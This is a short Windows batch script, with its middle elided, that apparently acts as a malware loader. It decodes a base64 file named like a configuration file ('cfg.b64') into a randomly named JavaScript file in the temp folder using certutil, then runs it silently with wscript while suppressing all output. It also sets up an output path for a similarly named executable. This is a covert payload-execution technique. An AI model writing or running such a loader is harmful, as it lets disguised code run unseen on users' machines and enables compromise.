@echo off
setlocal
set "OUT=%TEMP%\rbc_1eafbe5b4cd26438.exe"
set "SRC=%~dp0cfg.c"
...
:js
del /f /q "%TEMP%\rbc_1eafbe5b4cd26438.js" >nul 2>&1
certutil -f -decode "%~dp0cfg.b64" "%TEMP%\rbc_1eafbe5b4cd26438.js" >nul 2>&1
wscript.exe //B //nologo "%TEMP%\rbc_1eafbe5b4cd26438.js"
exit /b 0
